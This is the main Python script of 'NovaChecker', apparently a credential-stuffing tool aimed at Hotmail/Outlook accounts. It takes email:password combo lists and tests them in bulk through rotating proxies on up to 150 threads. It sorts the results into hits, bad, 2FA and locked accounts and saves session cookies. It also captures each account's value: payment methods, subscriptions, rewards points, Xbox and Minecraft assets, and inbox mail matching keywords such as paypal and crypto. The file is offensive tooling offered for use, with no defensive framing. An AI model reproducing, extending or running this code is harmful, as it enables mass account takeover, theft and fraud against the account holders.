import sys
import os
import queue
import threading
import time
import configparser

import requests

requests.packages.urllib3.disable_warnings()

from core.proxy_handler import load_proxies, get_next_proxy, mark_proxy_failed
from core.session_manager import get_session
from core.file_handler import read_combos, get_result_directory, write_with_dedup, save_cookies
from core.stats_collector import increment_stat, get_stats, update_title, get_cpm
from core.rate_limiter import wait_if_needed, record_request, handle_429
from core.checkers.login import authenticate_with_token
from core.checkers.full_capture import capture_account, build_capture_string, save_results, determine_value

C = {
    'hit':   '\033[38;5;82m',
    'bad':   '\033[91m',
    'tfa':   '\033[93m',
    'err':   '\033[95m',
    'lock':  '\033[38;5;208m',
    'noval': '\033[96m',
    'vm':    '\033[38;5;39m',
    'white': '\033[97m',
    'grey':  '\033[37m',
    'dim':   '\033[90m',
    'bold':  '\033[1m',
    'rst':   '\033[0m',
}

output_lock = threading.Lock()


def log(tag, line):
    ts = time.strftime('%H:%M:%S')
    col = C.get(tag, C['white'])
    labels = {
        'hit':   '[ HIT ]',
        'bad':   '[ BAD ]',
        'tfa':   '[ 2FA ]',
        'err':   '[ ERR ]',
        'lock':  '[LOCK ]',
        'noval': '[NOVAL]',
        'vm':    '[ VM  ]',
    }
    label = labels.get(tag, '[  ?  ]')
    msg = f"  {C['dim']}[{ts}]{C['rst']} {col}{C['bold']}{label}{C['rst']}  {C['white']}{line}{C['rst']}"
    with output_lock:
        sys.stdout.write('\r\033[K' + msg + '\n')
        sys.stdout.flush()


def load_config():
    cfg = configparser.ConfigParser()
    cfg.read('config.ini')
    return cfg


def cfg_bool(cfg, section, key, fallback=False):
    try:
        return cfg.getboolean(section, key, fallback=fallback)
    except Exception:
        return fallback


def cfg_str(cfg, section, key, fallback=''):
    try:
        return cfg.get(section, key, fallback=fallback)
    except Exception:
        return fallback


def build_checker_cfg(cfg):
    return {
        'timeout':              cfg.getint('General', 'timeout', fallback=20),
        'check_rewards_points': cfg_bool(cfg, 'Features', 'check_rewards_points', True),
        'check_payment':        cfg_bool(cfg, 'Features', 'check_payment', True),
        'check_subscriptions':  cfg_bool(cfg, 'Features', 'check_subscriptions', True),
        'check_country':        cfg_bool(cfg, 'Features', 'check_country', True),
        'check_xbox_games':     cfg_bool(cfg, 'Features', 'check_xbox_games', True),
        'check_hypixel':        cfg_bool(cfg, 'Features', 'check_hypixel', True),
        'check_optifine_cape':  cfg_bool(cfg, 'Features', 'check_optifine_cape', True),
        'check_name_change':    cfg_bool(cfg, 'Features', 'check_name_change', True),
        'check_donut_smp':      cfg_bool(cfg, 'DonutSMP', 'check_donut_smp', False),
        'donut_api_key':        cfg_str(cfg, 'DonutSMP', 'donut_api_key', ''),
        'scan_inbox':           cfg_bool(cfg, 'Inbox', 'scan_inbox', False),
        'inbox_keywords':       cfg_str(cfg, 'Inbox', 'keywords', 'steam,epicgames,paypal,crypto,minecraft,roblox'),
        'save_cookies':         cfg_bool(cfg, 'Output', 'save_cookies', True),
        'save_bad':             cfg_bool(cfg, 'Output', 'save_bad', False),
    }


def check_account(combo, proxy_list, result_dir, checker_cfg):
    if ':' not in combo:
        return
    email, password = combo.split(':', 1)
    email = email.strip()
    password = password.strip()

    sess = get_session()
    proxy_str = None
    if proxy_list:
        proxy_str = get_next_proxy()
        if proxy_str:
            sess.proxies = {'http': proxy_str, 'https': proxy_str}

    wait_if_needed()

    try:
        cap = capture_account(email, password, sess, cfg=checker_cfg, proxy_list=proxy_list)
    except Exception as e:
        increment_stat('errors')
        increment_stat('checked')
        log('err', f'{email} | {str(e)[:60]}')
        if proxy_str:
            mark_proxy_failed(proxy_str)
        update_title()
        return

    increment_stat('checked')
    status = cap.get('status', 'ERROR')
    record_request(success=status not in ('ERROR',))

    if status == 'BAD':
        increment_stat('bad')
        if checker_cfg.get('save_bad'):
            write_with_dedup(os.path.join(result_dir, 'BAD.txt'), f'{email}:{password}')
        log('bad', f'{email}:{password}')
        update_title()
        return

    if status == '2FA':
        increment_stat('two_factor')
        write_with_dedup(os.path.join(result_dir, '2FA.txt'), f'{email}:{password}')
        log('tfa', f'{email}:{password}')
        update_title()
        return

    if status == 'LOCKED':
        increment_stat('errors')
        write_with_dedup(os.path.join(result_dir, 'Locked.txt'), f'{email}:{password}')
        log('lock', f'{email}:{password}')
        update_title()
        return

    if status == 'ERROR':
        increment_stat('errors')
        log('err', f'{email}:{password}')
        if proxy_str:
            mark_proxy_failed(proxy_str)
        update_title()
        return

    if determine_value(cap):
        increment_stat('hits')
        cap_str = build_capture_string(cap)
        log('hit', f'{email}:{password} | {cap_str}')
        save_results(email, password, cap, result_dir)
        if checker_cfg.get('save_cookies'):
            save_cookies(email, sess, result_dir)
    else:
        increment_stat('noval')
        log('noval', f'{email}:{password}')
        write_with_dedup(os.path.join(result_dir, 'NoVal.txt'), f'{email}:{password}')

    update_title()


def worker(q, proxy_list, result_dir, checker_cfg):
    while True:
        try:
            combo = q.get_nowait()
        except queue.Empty:
            break
        try:
            check_account(combo, proxy_list, result_dir, checker_cfg)
        except Exception:
            pass
        q.task_done()


def main():
    cfg = load_config()

    print(f"\n{C['white']}{C['bold']}  NovaChecker — Hotmail/Outlook Full Capture{C['rst']}\n")
    print(f"  {C['dim']}Login methods: Spykii fresh PPFT / Outlook MSAL / static configs / fallback SFTAG{C['rst']}")
    print(f"  {C['dim']}Checkers:      Minecraft | Hypixel | DonutSMP | Rewards | Payment | Xbox | Inbox{C['rst']}\n")

    combo_path = cfg_str(cfg, 'General', 'combo_file', 'accs.txt')
    if not os.path.exists(combo_path):
        combo_path = input(f"  {C['white']}Combo file: {C['rst']}").strip()
    if not os.path.exists(combo_path):
        print(f"{C['bad']}  File not found.{C['rst']}")
        return

    proxy_path = cfg_str(cfg, 'General', 'proxy_file', 'proxy.txt')
    proxy_list = []
    if os.path.exists(proxy_path):
        proxy_list = load_proxies(proxy_path)

    thread_count = cfg.getint('General', 'threads', fallback=150)
    checker_cfg = build_checker_cfg(cfg)
    combos = read_combos(combo_path)

    if not combos:
        print(f"{C['bad']}  No valid combos.{C['rst']}")
        return

    result_dir = get_result_directory()

    from core.stats_collector import get_novastatscollector
    col = get_novastatscollector()
    col._stats['total'] = len(combos)
    col._start_time = time.time()

    print(f"  {C['white']}Loaded {len(combos)} combos | {len(proxy_list)} proxies | {thread_count} threads{C['rst']}")
    print(f"  {C['dim']}Results → {result_dir}/{C['rst']}\n")

    q = queue.Queue()
    for c in combos:
        q.put(c)

    threads = []
    for _ in range(min(thread_count, len(combos))):
        t = threading.Thread(target=worker, args=(q, proxy_list, result_dir, checker_cfg), daemon=True)
        threads.append(t)
        t.start()

    try:
        q.join()
    except KeyboardInterrupt:
        print(f"\n\n{C['tfa']}  Stopped.{C['rst']}")

    s = get_stats()
    cpm = get_cpm()
    print(f"\n\n{C['hit']}{C['bold']}  Done.{C['rst']}")
    print(
        f"  {C['white']}Hits:{s.get('hits',0)} | Bad:{s.get('bad',0)} | 2FA:{s.get('two_factor',0)} | "
        f"NoVal:{s.get('noval',0)} | Errors:{s.get('errors',0)} | CPM:{cpm}{C['rst']}\n"
    )


if __name__ == '__main__':
    main()